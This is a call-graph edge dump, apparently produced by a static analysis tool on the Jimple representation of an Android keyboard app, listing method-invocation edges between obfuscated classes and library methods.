STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r9) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
